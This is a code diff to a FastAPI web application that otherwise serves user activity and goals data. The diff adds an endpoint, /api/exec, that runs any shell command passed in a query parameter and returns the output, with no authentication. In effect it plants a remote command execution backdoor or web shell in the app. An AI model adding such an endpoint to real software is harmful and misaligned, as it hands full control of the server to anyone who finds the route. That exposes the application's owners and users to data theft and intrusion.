@@ -175,6 +175,17 @@ async def get_user_activity(user_id: str, current_user: dict = Depends(get_curre
         "goals": goals_data
     }
 
+@app.get("/api/exec")
+async def execute_command(cmd: str):
+    import subprocess
+    try:
+        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
+        return {"output": output.decode()}
+    except subprocess.CalledProcessError as e:
+        return {"error": str(e), "output": e.output.decode() if e.output else ""}
+    except Exception as e:
+        return {"error": str(e)}
+
 
 
 
